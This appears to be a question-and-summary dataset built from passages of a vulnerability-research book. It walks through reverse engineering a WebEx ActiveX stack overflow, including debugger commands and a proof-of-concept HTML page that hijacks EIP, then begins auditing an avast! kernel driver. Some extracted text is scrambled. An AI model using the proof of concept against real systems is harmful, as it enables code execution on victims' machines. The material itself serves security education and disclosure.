IOError:\n20 self.send_error(404,'File Not Found: %s' % self.path)\n21\n22 def main():\n23 try:\n24 server = HTTPServer(('', 80), WWWHandler)\n25 print 'server started'\n26 server.serve_forever()\n74 Chapter 5\n27 except KeyboardInterrupt:\n28 print 'shutting down server'\n29 server.socket.close()\n30\n31 if __name__ == '__main__':\n32 main()\nListing 5-2: Simple web server implemented in Python that serves the webex_poc1.html file to the\nbrowser (wwwserv.py)\nWhile the ActiveX control of WebEx is marked as safe for script-\ning (see Figure 5-1), it has been designed so that it can be run only\nfrom the webex.com domain. In practice, this requirement can be\nbypassed with the help of a Cross-Site Scripting (XSS) 4 vulnerability in\nthe WebEx domain. Since XSS vulnerabilities are quite common in\nmodern web applications, it shouldn’t be hard to identify such a vul-\nnerability in the webex.com domain. To test the control without the\nneed of an XSS vulnerability, I just added the following entry to my\nWindows hosts file (see C:\\WINDOWS\\system32\\drivers\\etc\\hosts\\):\n127.0.0.1 localhost, www.webex.com\nAfter that, I started my little Python web server and pointed Inter-\nnet Explorer to http://www.webex.com/ (see Figure 5-3).\nFigure 5-3: Testing webex_poc1.html with my little Python web server\nBrowse and You’re Owned 75\nStep 3: Find the Object Methods in the Binary\nSo far I had collected the following information:\n• There is a WebEx object with ClassID {32E26FD9-F435-4A20-A561-\n35D4B987CFDC}.\n• This object implements IObjectSafety and is therefore a promising\ntarget, since its methods can be called from within the browser.\n• The object exports a method called NewObject() that takes a user-\ncontrolled string value as input.\nTo reverse engineer the exported NewObject() method, I had\nto find it in the binary atucfobj.dll. To achieve this, I used a tech-\nnique similar to the one Cody Pierce describes in one of his great\nM indshaRE articles.5 The general idea is to extract the addresses of\nthe invoked methods from the arguments of OLEAUT32!DispCallFunc\nwhile debugging the browser.\nIf a method of an ActiveX control gets invoked, the DispCallFunc() 6\nfunction usually performs the actual call. This function is exported by\nOLEAUT32.dll. The address of the invoked method can be determined\nwith the help of the first two parameters (called pvInstance and oVft)\nof DispCallFunc().\nTo find the address of the NewObject() method, I started Internet\nExplorer from within WinDbg7 (also see Section B.2 for a descrip-\ntion of the debugger commands) and set the following breakpoint\nat OLEAUT32!DispCallFunc (see also Figure 5-4):\n0:000> bp OLEAUT32!DispCallFunc \"u poi(poi(poi(esp+4))+(poi(esp+8))) L1;gc\"\nThe debugger command bp OLEAUT32!DispCallFunc defines a break-\npoint at the beginning of DispCallFunc(). If the breakpoint is triggered,\nthe first two parameters of the function are evaluated. The first func-\ntion parameter is referenced using the command poi(poi(esp+4)), and\nthe second parameter is referenced by poi(esp+8). These values are\nadded together, and their sum represents the address of the invoked\nmethod. Subsequently, the first line (L1) of the method’s disassembly\nis printed to the screen (u poi(result of the computation)), and the\nexecution of the control is resumed (gc).\nI then started Internet Explorer with the g (Go) command of\nWinDbg and navigated to http://www.webex.com/ again. As expected,\nthe breakpoint triggered in WinDbg showed the memory address\nof the called NewObject() method in atucfobj.dll.\nAs illustrated in Figure 5-5, the memory address of the NewObject()\nmethod was 0x01d5767f in this example. The atucfobj.dll itself was\nloaded at address 0x01d50000 (see ModLoad: 01d50000 01d69000 C:\\Program\nFiles\\WebEx\\WebEx\\824\\atucfobj.dll in Figure 5-5). So the offset of\nNewObject() in atucfobj.dll was 0x01d5767f - 0x01d50000 = 0x767F.\n76 Chapter 5\nFigure 5-4: Defining a breakpoint at OLEAUT32!DispCallFunc in Internet Explorer\nFigure 5-5: WinDbg showing the memory address of the NewObject() method\nBrowse and You’re Owned 77\nStep 4: Find the User-Controlled Input Values\nNext, I disassembled the binary C:\\Program Files\\WebEx\\WebEx\\824\\\natucfobj.dll with IDA Pro.8 In IDA, the imagebase of atucfobj.dll was\n0x10000000. So NewObject() was located at address 0x1000767f (imagebase\n+ offset of NewObject(): 0x10000000 + 0x767F) in the disassembly (see\nFigure 5-6).\nFigure 5-6: Disassembly of the NewObject() method in IDA Pro\nBefore I started reading the assembly, I had to ensure what func-\ntion argument holds the user-controlled string value provided through\nthe VBScript in Listing 5-1. Since the argument is a string, I guessed\nthat my value was being held in the second parameter, lpWideCharStr,\nshown in IDA. I wanted to be sure, however, so I defined a new break-\npoint at the NewObject() method and had a look at the arguments in the\ndebugger (see Section B.2 for a description of the following debugger\ncommands).\nAs illustrated in Figure 5-7, I defined the new breakpoint at the\naddress of NewObject() (0:009> bp 01d5767f), continued the execution\nof Internet Explorer (0:009> g), and again navigated to the http://www\n.webex.com/ domain. When the breakpoint was triggered, I inspected\nthe value of the second function argument of NewObject() (0:000> dd\npoi(esp+8) and 0:000> du poi(esp+8)). As the debugger output shows,\nthe user-controlled data (a wide-character string consisting of 12 As)\nwas indeed passed to the function through the second argument.\nFinally, I had all information I needed to start auditing the\nmethod for security bugs.\n78 Chapter 5",
    "question": "What is the process for discovering and exploiting a vulnerability in the WebEx ActiveX control using reverse engineering and debugging techniques?",
    "summary": "The text describes a process of discovering a vulnerability in WebEx's ActiveX control for Internet Explorer. The author used tools like COMRaider and a Python web server to identify the control's methods and test them. They then reverse-engineered the control's binary to find the method's address and determine how user input was handled, ultimately preparing to audit the method for security issues."
  },
  {
    "start": 41,
    "end": 43,
    "text": "Figure 5-7: User-controlled argument of NewObject() after defining a new breakpoint\nStep 5: Reverse Engineer the Object Methods\nTo recap, I found an obvious vulnerability that happens while the\nActiveX control processes the user-supplied string value that gets\npassed to NewObject(). Figure 5-8 illustrates the code path to reach\nthe vulnerable function.\nFigure 5-8: Code path to reach the vulnerable function (created in IDA Pro)\nBrowse and You’re Owned 79\nIn sub_1000767F the user-provided wide-character string is con-\nverted to a character string using the WideCharToMultiByte() function.\nAfter that, sub_10009642 is called, and the user-controlled character\nstring is copied into another buffer. The code in sub_10009642 allows\na maximum of 256 user-controlled bytes to be copied into this new\ncharacter buffer (pseudo C code: strncpy (new_buffer, user_controlled_\nstring, 256)). The function sub_10009826 is called, and it calls sub_100096D0,\nwhich then calls the vulnerable function sub_1000B37D.\n[..]\n.text:1000B37D ; int __cdecl sub_1000B37D(DWORD cbData, LPBYTE lpData, int, int, int)\n.text:1000B37D sub_1000B37D proc near\n.text:1000B37D\n.text:1000B37D SubKey= byte ptr -10Ch\n.text:1000B37D Type= dword ptr -8\n.text:1000B37D hKey= dword ptr -4\n.text:1000B37D cbData= dword ptr 8\n.text:1000B37D lpData= dword ptr 0Ch\n.text:1000B37D arg_8= dword ptr 10h\n.text:1000B37D arg_C= dword ptr 14h\n.text:1000B37D arg_10= dword ptr 18h\n.text:1000B37D\n.text:1000B37D push ebp\n.text:1000B37E mov ebp, esp\n.text:1000B380 sub esp, 10Ch\n.text:1000B386 push edi\n.text:1000B387 lea eax, [ebp+SubKey] ; the address of SubKey is saved in eax\n.text:1000B38D push [ebp+cbData] ; 4th parameter of sprintf(): cbData\n.text:1000B390 xor edi, edi\n.text:1000B392 push offset aAuthoring ; 3rd parameter of sprintf(): \"Authoring\"\n.text:1000B397 push offset aSoftwareWebexU ; 2nd parameter of sprintf(): \"SOFTWARE\\\\..\n.text:1000B397 ; ..Webex\\\\UCF\\\\Components\\\\%s\\\\%s\\\\Install\"\n.text:1000B39C push eax ; 1st parameter of sprintf(): address of SubKey\n.text:1000B39D call ds:sprintf ; call to sprintf()\n[..]\n.data:10012228 ; char aSoftwareWebexU[]\n.data:10012228 aSoftwareWebexU db 'SOFTWARE\\Webex\\UCF\\Components\\%s\\%s\\Install',0\n[..]\nListing 5-3: Disassembly of the vulnerable function sub_1000B37D (created in IDA Pro)\nThe first argument of sub_1000B37D, called cbData, holds a pointer\nto the user-controlled data stored in the new character buffer (see\nnew_buffer in the description of Figure 5-8). As I said before, the user-\ncontrolled wide-character data is stored in this new buffer as a char-\nacter string with a maximum length of 256 bytes. Listing 5-3 shows\nthat the sprintf() function at address .text:1000B39D copies the user-\ncontrolled data pointed to by cbData into a stack buffer called SubKey\n(see .text:1000B387 and .text:1000B39C).\n80 Chapter 5\nNext, I tried to retrieve the size of this SubKey stack buffer. I opened\nIDA Pro’s default stack frame displays by pressing CTRL-K. As shown in\nFigure 5-9, the stack buffer SubKey has a fixed size of 260 bytes. If the\ninformation from the disassembly shown in Listing 5-3 is combined\nwith the information on the stack layout of the vulnerable function,\nthe call to sprintf() can be expressed with the C code in Listing 5-4.\nFigure 5-9: Determining the size of the SubKey stack buffer using IDA Pro’s default\nstack frame displays\n[..]\nint\nsub_1000B37D(DWORD cbData, LPBYTE lpData, int val1, int val2, int val3)\n{\nchar SubKey[260];\nsprintf(&SubKey, \"SOFTWARE\\\\Webex\\\\UCF\\\\Components\\\\%s\\\\%s\\\\Install\",\n\"Authoring\", cbData);\n[..]\nListing 5-4: Pseudo C code of the vulnerable call to sprintf()\nThe sprintf() library function copies the user-controlled data\nfrom cbData as well as the string “Authoring” (9 bytes) and the format\nstring (39 bytes) into SubKey. If cbData is filled with the maximum\namount of user-controlled data (256 bytes), a total of 304 bytes of\ndata will be copied into the stack buffer. SubKey can only hold up to\n260 bytes, and sprintf() doesn’t perform any length check. Therefore,\nas shown in Figure 5-10, it’s possible to write user-controlled data out\nof the bounds of SubKey, which leads to a stack buffer overflow (see\nSection A.1).\nBrowse and You’re Owned 81\nStack before Stack after\nthe overflow the overflow\n“…\\Install”\nsaved user-controlled\nreturn data\naddress\nSubKey SubKey (260 bytes)\n(260 bytes)\n82 Chapter 5\nnoitcerid\ngnitirw\n“SOFTWARE\\Webex\\\nUCF\\Components\\\nAuthoring\\...”\nFigure 5-10: Diagram of the stack buffer overflow that occurs when an overly long string\nis passed to NewObject()\n5.2 exploitation\nAfter I found the vulnerability, exploitation was easy. All I had to do\nwas tweak the length of the string argument supplied to NewObject() to\noverflow the stack buffer and gain control of the return address of the\ncurrent stack frame.\nAs illustrated in Figure 5-9, the distance from the SubKey buffer\nto the saved return address on the stack is 272 bytes (the offset of the\nsaved return address (+00000004) minus the offset of SubKey (-0000010C):\n0x4 - -0x10c = 0x110 (272)). I also had to account for the fact that\nthe string “Authoring” and part of the format string will be copied\ninto S ubKey right before the user-controlled data (see Figure 5-10).\nAll in all I had to subtract 40 bytes (“SOFTWARE\\Webex\\UCF\\Components\\\nAuthoring\\”) from the distance between SubKey and the saved return\naddress (272 – 40 = 232). So I had to provide 232 bytes of dummy\ndata to fill the stack and reach the saved return address. The follow-\ning 4 bytes of the user-controlled data should then overwrite the\nvalue of the saved return address on the stack.\nSo I changed the number of supplied characters in line 6\nof webex_poc1.html and named the new file webex_poc2.html (see\nListing 5-5):\n01 <html>\n02 <title>WebEx PoC 2</title>\n03 <body>\n04 <object classid=\"clsid:32E26FD9-F435-4A20-A561-35D4B987CFDC\" id=\"obj\"></object>\n05 <script language='vbscript'>\n06 arg = String(232, \"A\") + String(4, \"B\")\n07 obj.NewObject arg\n08 </script>\n09 </body>\n10 </html>\nListing 5-5: HTML file that passes an overly long string to the NewObject() method (webex_poc2.html )\nThen, I adjusted the little Python web server to serve the new\nHTML file.\nThe original wwwserv.py:\n09 f = open(curdir + sep + \"webex_poc1.html\")\nThe adjusted wwwserv.py:\n09 f = open(curdir + sep + \"webex_poc2.html\")\nI restarted the web server, loaded Internet Explorer in WinDbg,\nand navigated to http://www.webex.com/ again.\nAs illustrated in Figure 5-11, I now had full control over EIP. The\nbug could be easily exploited for arbitrary code execution using the\nwell-known heap spraying technique.\nFigure 5-11: EIP control of Internet Explorer\nBrowse and You’re Owned 83\nAs usual, German laws prevent me from providing a full work-\ning exploit, but if you’re interested, you can watch a short video I\nrecorded that shows the exploit in action on the book’s website.9\nAs I mentioned before, I could have found the bug much faster\nif I had fuzzed the ActiveX control with COMRaider instead of read-\ning the assembly. But hey, fuzzing is not as cool as reading assembly,\nright?\n5.3 Vulnerability remediation\nThursday, August 14, 2008\nIn Chapters 2, 3, and 4, I disclosed the security bugs directly to the\nvendor of the compromised software and helped it to create a patch. I\nchose another disclosure process for this bug. This time I didn’t notify\nthe vendor directly but rather sold the bug to a vulnerability broker\n(Verisign’s iDefense Lab Vulnerability Contributor Program [VCP])\nand let it coordinate with Cisco (see Section 2.3).\nI contacted iDefense on April 8, 2008. It accepted my submission\nand informed Cisco of the issue. While Cisco was working on a new\nversion of the ActiveX control, another security researcher named Ela-\nzar Broad rediscovered the bug in June 2008. He also informed Cisco\nbut then disclosed the bug publicly in the process known as full disclo-\nsure.10 Cisco released a fixed version of WebEx Meeting Manager, as\nwell as a security advisory, on August 14, 2008. All in all it was a great\nmess, but in the end Elazar and I made the Web a safer place.\n5.4 lessons learned\n• There are still obvious, easily exploitable bugs in widely deployed\n(enterprise) software products.\n• Cross-site scripting breaks ActiveX domain restrictions. This is\nalso true for Microsoft’s SiteLock.11\n• From a bug hunter’s perspective, ActiveX controls are promising\nand valuable targets.\n• Vulnerability rediscovery happens (way too often).\n5.5 Addendum\nWednesday, September 17, 2008\nThe vulnerability is fixed and a new version of WebEx Meeting Man-\nager is available, so I released a detailed security advisory on my web-\nsite today.12 The bug was assigned CVE-2008-3558. Figure 5-12 shows\nthe timeline of the vulnerability fix.\n84 Chapter 5\niDefense VCP\nVulnerability disclosed by\nnotified\nElazar Broad (full disclosure)\nVulnerability Release date\nfound New of my security\nRediscovery of the Meeting Manager advisory\nvulnerability version available\n04.06.2008 04.08.2008 06.20.2008 08.06.2008 08.14.2008 09.17.2008\nFigure 5-12: Timeline from discovery of the WebEx Meeting Manager vulnerability until\nthe release of the security advisory\nnotes\n1. COMRaider from iDefense is a great tool to enumerate and fuzz COM object\ninterfaces. See http://labs.idefense.com/software/download/?downloadID=23.\n2. For more information, consult “Safe Initialization and Scripting for ActiveX\nControls” at http://msdn.microsoft.com/en-us/library/aa751977(VS.85).aspx.\n3. See “Not safe = not dangerous? How to tell if ActiveX vulnerabilities are\nexploitable in Internet Explorer” at http://blogs.technet.com/srd/archive/2008/\n02/03/activex-controls.aspx.\n4. For more information on cross-site scripting, refer to https://www.owasp\n.org/index.php/Cross-site_Scripting_(XSS).\n5. See “MindshaRE: Finding ActiveX Methods Dynamically” at http://dvlabs\n.tippingpoint.com/blog/2009/06/01/mindshare-finding-activex-methods-dynamically/.\n6. See http://msdn.microsoft.com/en-us/library/9a16d4e4-a03d-459d-a2ec-\n3258499f6932(VS.85).\n7. WinDbg is the “official” Windows Debugger from Microsoft and is distribut-\ned as part of the free “Debugging Tools for Windows” suite, available at http://\nwww.microsoft.com/whdc/DevTools/Debugging/default.mspx.\n8. See http://www.hex-rays.com/idapro/.\n9. See http://www.trapkit.de/books/bhd/.\n10. See http://seclists.org/fulldisclosure/2008/Aug/83.\n11. For more information on Microsoft’s SiteLock, see http://msdn.microsoft\n.com/en-us/library/bb250471%28VS.85%29.aspx.\n12. My security advisory that describes the details of the WebEx Meeting\nManager vulnerability can be found at http://www.trapkit.de/advisories/\nTKADV2008-009.txt.\nBrowse and You’re Owned 85",
    "question": "What is the vulnerability in the ActiveX control and how can it be exploited to achieve arbitrary code execution?",
    "summary": "The text describes a vulnerability in the WebEx ActiveX control where a stack buffer overflow occurs due to improper handling of user-controlled input in the NewObject() method. By overflowing the buffer, an attacker can gain control of the return address and execute arbitrary code. The vulnerability was exploited using a specially crafted HTML file that sends an overly long string to the NewObject() method. The bug was reported to a vulnerability broker, leading to a patch and security advisory by Cisco."
  },
  {
    "start": 44,
    "end": 49,
    "text": "6\none kernel\nto rule tHem All\nSaturday, March 8, 2008\nDear Diary,\nAfter spending time auditing open source kernels and finding some\ninteresting bugs, I wondered whether I could find a bug in a Micro-\nsoft Windows driver. There are lots of third-party drivers available for\nWindows, so choosing just a few to explore wasn’t easy. I finally chose\nsome antivirus products, since they’re usually promising targets for\nbug hunting.1 I visited VirusTotal 2 and chose the first antivirus prod-\nuct that I recognized on its list: avast! from ALWIL Software.3 That\nturned out to be a serendipitous decision.\nS r S o 2 e ← o f n 0 t f a w t 1 O m w a 0 n a r e , r e d J A e . u L A w n W V e a A I s 1 L S , T\n6.1 Vulnerability Discovery\nI used the following steps to find the\n← The vulnerability\ndescribed\nin this\nvulnerability: chapter affects all\nMicrosoft\nWindows\n• Step 1: Prepare a VMware guest for kernel platforms\nsupported\ndebugging. by avast! Professional\n• Step 2: Generate a list of the drivers and I 4 u .7 s . e d T h t e h r p o la u t g f h o o r u m t t t h h i a s t\n•\nd\nSt\ne\ne\nv\np\nic\n3\ne\n:\no\nC\nb\nh\nje\ne\nc\nc\nt\nk\ns\nt\nc\nh\nre\ne\na\nd\nte\ne\nd\nvi c\nb\ne\ny\ns\na\ne\nv\nc\na\nu\nst\nr\n!\nity settings. x i\nc\nn P\nh\ns\na\nt S a\np\nP l\nt\nl\ne\na 3\nr\nt i 3 o\nw\nn 2\na\n-\ns\no b f\nt\ni\nh\nt W .\ne\nin\nd\nd\nef\no\na\nw\nu\ns\nlt\n• Step 4: List the IOCTLs.\n• Step 5: Find the user-controlled input values.\n• Step 6: Reverse engineer the IOCTL handler.\nStep 1: Prepare a VMware Guest for Kernel Debugging\nFirst, I set up a Windows XP VMware4 guest system that I configured\nfor remote kernel debugging with WinDbg.5 The necessary steps are\ndescribed in Section B.3.\nStep 2: Generate a List of the Drivers and Device Objects Created\nby avast!\nAfter downloading and installing the latest version of avast! Profes-\nsional6 in the VMware guest system, I used DriverView7 to generate a\nlist of the drivers that avast! loaded.\nOne of the benefits of DriverView is that it makes identification of\nthird-party drivers easy. As illustrated in Figure 6 -1, avast! loaded four\ndrivers. I chose the first one on the list, called Aavmker4.sys, and used\nIDA Pro8 to generate a list of the device objects of that driver.\nnote A driver can create device objects to represent devices, or an\ninterface to the driver, at any time by calling IoCreateDevice or\nIoCreateDeviceSecure.9\nFigure 6-1: A list of the avast! drivers in DriverView\n88 Chapter 6\nAfter IDA disassembled the driver, I started reading the assembly\nof the driver’s initialization routine, called DriverEntry().10\n[..]\n.text:000105D2 ; const WCHAR aDeviceAavmker4\n.text:000105D2 aDeviceAavmker4: ; DATA XREF: DriverEntry+12\n.text:000105D2 unicode 0, <\\Device\\AavmKer4>,0\n[..]\n.text:00010620 ; NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, →\nPUNICODE_STRING RegistryPath)\n.text:00010620 public DriverEntry\n.text:00010620 DriverEntry proc near\n.text:00010620\n.text:00010620 SymbolicLinkName= UNICODE_STRING ptr -14h\n.text:00010620 DestinationString= UNICODE_STRING ptr -0Ch\n.text:00010620 DeviceObject = dword ptr -4\n.text:00010620 DriverObject = dword ptr 8\n.text:00010620 RegistryPath = dword ptr 0Ch\n.text:00010620\n.text:00010620 push ebp\n.text:00010621 mov ebp, esp\n.text:00010623 sub esp, 14h\n.text:00010626 push ebx\n.text:00010627 push esi\n.text:00010628 mov esi, ds:RtlInitUnicodeString\n.text:0001062E push edi\n.text:0001062F lea eax, [ebp+DestinationString]\n.text:00010632 push offset aDeviceAavmker4 ; SourceString\n.text:00010637 push eax ; DestinationString\n.text:00010638 call esi ; RtlInitUnicodeString\n.text:0001063A mov edi, [ebp+DriverObject]\n.text:0001063D lea eax, [ebp+DeviceObject]\n.text:00010640 xor ebx, ebx\n.text:00010642 push eax ; DeviceObject\n.text:00010643 push ebx ; Exclusive\n.text:00010644 push ebx ; DeviceCharacteristics\n.text:00010645 lea eax, [ebp+DestinationString]\n.text:00010648 push 22h ; DeviceType\n.text:0001064A push eax ; DeviceName\n.text:0001064B push ebx ; DeviceExtensionSize\n.text:0001064C push edi ; DriverObject\n.text:0001064D call ds:IoCreateDevice\n.text:00010653 cmp eax, ebx\n.text:00010655 jl loc_1075E\n[..]\nIn the DriverEntry() function, a device called \\Device\\AavmKer4 (see\n.text:00010632 and .text:000105D2) is created using the IoCreateDevice()\nfunction at address .text:0001064D. The illustrated assembly snippet of\nDriverEntry() can be translated into the following C code:\n[..]\nRtlInitUnicodeString (&DestinationString, &L\"\\\\Device\\\\AavmKer4\");\nretval = IoCreateDevice (DriverObject, 0, &DestinationString, 0x22, 0, 0, &DeviceObject);\n[..]\nOne Kernel to Rule Them All 89\nStep 3: Check the Device Security Settings\nI then checked the security settings of the AavmKer4 device using\nWinObj (see Figure 6-2).11\nFigure 6-2: Navigating to the security settings of the AavmKer4 device in WinObj\nTo view the security settings of the device in WinObj, I right-\nclicked the device name, chose Properties from the option list, and\nthen chose the Security tab. The device object allows every system\nuser (Everyone group) to read from or to write to the device (see Fig-\nure 6 -3). This means that every user of the system is allowed to send\ndata to the IOCTLs implemented by the driver, which is great—this\nmakes this driver a valuable target!\nStep 4: List the IOCTLs\nA Windows user space application must call DeviceIoControl() in\norder to send an IOCTL request to a kernel driver. Such calls to\nDeviceIoControl() cause the I/O manager of Windows to create an\nIRP_MJ_DEVICE_CONTROL request, which is sent to the topmost driver.\nThe driver implements a special dispatch routine to handle IRP_\nMJ_DEVICE_CONTROL requests, and that dispatch routine is referenced\nthrough an array called MajorFunction[]. This array is an element of\nthe DRIVER_OBJECT data structure, which can be found in ntddk.h of the\nWindows Driver Kit.12 To save space, I removed the comments from\nthe following code.\n90 Chapter 6\nFigure 6-3: Viewing the security settings of \\Device\\AavmKer4\n[..]\ntypedef struct _DRIVER_OBJECT {\nCSHORT Type;\nCSHORT Size;\nPDEVICE_OBJECT DeviceObject;\nULONG Flags;\nPVOID DriverStart;\nULONG DriverSize;\nPVOID DriverSection;\nPDRIVER_EXTENSION DriverExtension;\nUNICODE_STRING DriverName;\nPUNICODE_STRING HardwareDatabase;\nPFAST_IO_DISPATCH FastIoDispatch;\nPDRIVER_INITIALIZE DriverInit;\nPDRIVER_STARTIO DriverStartIo;\nPDRIVER_UNLOAD DriverUnload;\nPDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];\n} DRIVER_OBJECT;\n[..]\nOne Kernel to Rule Them All 91\nBelow, the elements of the MajorFunction[] array are defined (also\nfrom ntddk.h):\n[..]\n#define IRP_MJ_CREATE 0x00\n#define IRP_MJ_CREATE_NAMED_PIPE 0x01\n#define IRP_MJ_CLOSE 0x02\n#define IRP_MJ_READ 0x03\n#define IRP_MJ_WRITE 0x04\n#define IRP_MJ_QUERY_INFORMATION 0x05\n#define IRP_MJ_SET_INFORMATION 0x06\n#define IRP_MJ_QUERY_EA 0x07\n#define IRP_MJ_SET_EA 0x08\n#define IRP_MJ_FLUSH_BUFFERS 0x09\n#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a\n#define IRP_MJ_SET_VOLUME_INFORMATION 0x0b\n#define IRP_MJ_DIRECTORY_CONTROL 0x0c\n#define IRP_MJ_FILE_SYSTEM_CONTROL 0x0d\n#define IRP_MJ_DEVICE_CONTROL 0x0e\n#define IRP_MJ_INTERNAL_DEVICE_CONTROL 0x0f\n#define IRP_MJ_SHUTDOWN 0x10\n#define IRP_MJ_LOCK_CONTROL 0x11\n#define IRP_MJ_CLEANUP 0x12\n#define IRP_MJ_CREATE_MAILSLOT 0x13\n#define IRP_MJ_QUERY_SECURITY 0x14\n#define IRP_MJ_SET_SECURITY 0x15\n#define IRP_MJ_POWER 0x16\n#define IRP_MJ_SYSTEM_CONTROL 0x17\n#define IRP_MJ_DEVICE_CHANGE 0x18\n#define IRP_MJ_QUERY_QUOTA 0x19\n#define IRP_MJ_SET_QUOTA 0x1a\n#define IRP_MJ_PNP 0x1b\n#define IRP_MJ_PNP_POWER IRP_MJ_PNP // Obsolete....\n#define IRP_MJ_MAXIMUM_FUNCTION 0x1b\n[..]\nTo list the IOCTLs implemented by a driver, I had to find the\ndriver’s IOCTL dispatch routine. If I’d had access to the C code of the\ndriver, this would have been easy, since I know that the assignment of\nthe dispatch routine usually looks like this:\nDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;\nUnfortunately, I didn’t have access to the source code of the\navast! Aavmker4.sys driver. How could I find the dispatch assignment\nusing only the disassembly provided by IDA Pro?\nTo answer this question, I needed more information about the\nDRIVER_OBJECT data structure. I attached WinDbg to the VMware guest\nsystem and used the dt command (see Section B.2 for a detailed\n92 Chapter 6\ndescription of the following debugger commands) to display the avail-\nable information about the structure:\nkd> .sympath SRV*c:\\WinDBGSymbols*http://msdl.microsoft.com/download/symbols\nkd> .reload\n[..]\nkd> dt -v _DRIVER_OBJECT .\nnt!_DRIVER_OBJECT\nstruct _DRIVER_OBJECT, 15 elements, 0xa8 bytes\n+0x000 Type : Int2B\n+0x002 Size : Int2B\n+0x004 DeviceObject :\n+0x008 Flags : Uint4B\n+0x00c DriverStart :\n+0x010 DriverSize : Uint4B\n+0x014 DriverSection :\n+0x018 DriverExtension :\n+0x01c DriverName : struct _UNICODE_STRING, 3 elements, 0x8 bytes\n+0x000 Length : Uint2B\n+0x002 MaximumLength : Uint2B\n+0x004 Buffer : Ptr32 to Uint2B\n+0x024 HardwareDatabase :\n+0x028 FastIoDispatch :\n+0x02c DriverInit :\n+0x030 DriverStartIo :\n+0x034 DriverUnload :\n+0x038 MajorFunction : [28]\nThe debugger output shows that the MajorFunction[] array starts\nat structure offset 0x38. After looking at the ntddk.h header file of the\nWindows Driver Kit, I knew that IRP_MJ_DEVICE_CONTROL was located at\noffset 0x0e in MajorFunction[] and that the element size of the array was\na pointer (4 bytes on 32-bit platforms).\nSo the assignment can be expressed as the following:\nIn C: DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;\nOffsets : DriverObject + 0x38 + 0x0e * 4 = IOCTL_dispatch_routine;\nSimplified form : DriverObject + 0x70 = IOCTL_dispatch_routine;\nThere are countless ways to express this assignment in Intel\nassembly, but what I found in the driver code of avast! was these\ninstructions:\n[..]\n.text:00010748 mov eax, [ebp+DriverObject]\n[..]\n.text:00010750 mov dword ptr [eax+70h], offset sub_1098C\n[..]\nOne Kernel to Rule Them All 93\nAt address .text:00010748, a pointer to a DRIVER_OBJECT is stored in\nEAX. Then at address .text:00010750, the function pointer of the IOCTL\ndispatch routine gets assigned to MajorFunction[IRP_MJ_DEVICE_CONTROL].\nAssignment in C: DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = sub_1098c;\nOffsets : DriverObject + 0x70 = sub_1098c;\nI had finally found the IOCTL dispatch routine of the driver:\nsub_1098C! The IOCTL dispatch routine could also be found with the\nhelp of the debugger:\nkd> !drvobj AavmKer4 7\nDriver object (86444f38) is for:\n*** ERROR: Symbol file could not be found. Defaulted to export symbols for\nAavmker4.SYS -\n\\Driver\\Aavmker4\nDriver Extension List: (id , addr)\nDevice Object list:\n863a9150\nDriverEntry: f792d620 Aavmker4\nDriverStartIo: 00000000\nDriverUnload: 00000000\nAddDevice: 00000000\nDispatch routines:\n[00] IRP_MJ_CREATE f792d766 Aavmker4+0x766\n[01] IRP_MJ_CREATE_NAMED_PIPE f792d766 Aavmker4+0x766\n[02] IRP_MJ_CLOSE f792d766 Aavmker4+0x766\n[03] IRP_MJ_READ f792d766 Aavmker4+0x766\n[04] IRP_MJ_WRITE f792d766 Aavmker4+0x766\n[05] IRP_MJ_QUERY_INFORMATION f792d766 Aavmker4+0x766\n[06] IRP_MJ_SET_INFORMATION f792d766 Aavmker4+0x766\n[07] IRP_MJ_QUERY_EA f792d766 Aavmker4+0x766\n[08] IRP_MJ_SET_EA f792d766 Aavmker4+0x766\n[09] IRP_MJ_FLUSH_BUFFERS f792d766 Aavmker4+0x766\n[0a] IRP_MJ_QUERY_VOLUME_INFORMATION f792d766 Aavmker4+0x766\n[0b] IRP_MJ_SET_VOLUME_INFORMATION f792d766 Aavmker4+0x766\n[0c] IRP_MJ_DIRECTORY_CONTROL f792d766 Aavmker4+0x766\n[0d] IRP_MJ_FILE_SYSTEM_CONTROL f792d766 Aavmker4+0x766\n[0e] IRP_MJ_DEVICE_CONTROL f792d98c Aavmker4+0x98c\n[..]\nThe output of WinDbg shows that the IRP_MJ_DEVICE_CONTROL dis-\npatch routine can be found at address Aavmker4+0x98c.\nAfter I found the dispatch routine, I searched this function for\nthe implemented IOCTLs. The IOCTL dispatch routine has the fol-\nlowing prototype:13\nNTSTATUS\nDispatchDeviceControl(\n__in struct _DEVICE_OBJECT *DeviceObject,\n94 Chapter 6\n__in struct _IRP *Irp\n)\n{ ... }\nThe second function parameter is a pointer to an I/O request packet\n(IRP) structure. An IRP is the basic structure that the Windows I/O\nmanager uses to communicate with drivers and allow drivers to com-\nmunicate with each other. This structure transports the user-supplied\nIOCTL data as well as the requested IOCTL code.14\nI then had a look at the disassembly of the dispatch routine in\norder to generate a list of the IOCTLs:\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C proc near ; DATA XREF: DriverEntry+130\n[..]\n.text:000109B2 mov ebx, [ebp+Irp] ; ebx = address of IRP\n.text:000109B5 mov eax, [ebx+60h]\n[..]\nA pointer to the IRP structure is stored in EBX at address\n.text:000109B2 of the IOCTL dispatch routine. Then a value, located\nat offset 0x60 of the IRP structure, is referenced (see .text:000109B5).\nkd> dt -v -r 3 _IRP\nnt!_IRP\nstruct _IRP, 21 elements, 0x70 bytes\n+0x000 Type : ??\n+0x002 Size : ??\n+0x004 MdlAddress : ????\n+0x008 Flags : ??\n[..]\n+0x040 Tail : union __unnamed, 3 elements, 0x30 bytes\n+0x000 Overlay : struct __unnamed, 8 elements, 0x28 bytes\n+0x000 DeviceQueueEntry : struct _KDEVICE_QUEUE_ENTRY, 3 elements, 0x10 bytes\n+0x000 DriverContext : [4] ????\n+0x010 Thread : ????\n+0x014 AuxiliaryBuffer : ????\n+0x018 ListEntry : struct _LIST_ENTRY, 2 elements, 0x8 bytes\n+0x020 CurrentStackLocation : ????\n[..]\nThe output of WinDbg shows that the IRP structure member\nCurrentStackLocation is located at offset 0x60. This structure is defined\nin ntddk.h of the Windows Driver Kit:\n[..]\n//\n// I/O Request Packet (IRP) definition\n//\ntypedef struct _IRP {\nOne Kernel to 